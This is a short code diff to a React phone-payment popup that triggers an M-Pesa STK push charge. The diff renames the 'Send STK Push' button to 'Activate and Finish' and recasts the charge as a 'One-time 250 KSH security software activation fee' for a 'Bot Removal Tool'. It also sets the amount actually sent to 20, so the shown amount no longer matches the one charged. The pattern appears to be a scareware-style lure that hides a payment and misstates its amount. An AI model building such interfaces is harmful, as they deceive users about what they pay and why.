@@ -73,7 +73,7 @@ export function PhonePaymentPopup({
         },
         body: JSON.stringify({
           phoneNumber: cleanPhone,
-          amount: 250,
+          amount: 20,
           description: 'Security Software Activation - Bot Removal Tool'
         })
       })
@@ -212,7 +212,7 @@ export function PhonePaymentPopup({
                         Enter Phone Number
                       </h2>
                       <p className="text-sm text-gray-300">
-                        M-Pesa payment for 250 KSH
+                        One-time 250 KSH security software activation fee
                       </p>
                     </div>
 
@@ -260,7 +260,7 @@ export function PhonePaymentPopup({
                         className="w-full py-3 text-base font-bold bg-gradient-to-r from-green-500 to-emerald-500 hover:from-green-600 hover:to-emerald-600 text-white border-0 shadow-lg transform transition-all duration-200 hover:scale-105 disabled:opacity-50"
                       >
                         <Shield className="w-5 h-5 mr-2" />
-                        Send STK Push
+                        Activate and Finish
                       </Button>
 
                       <Button
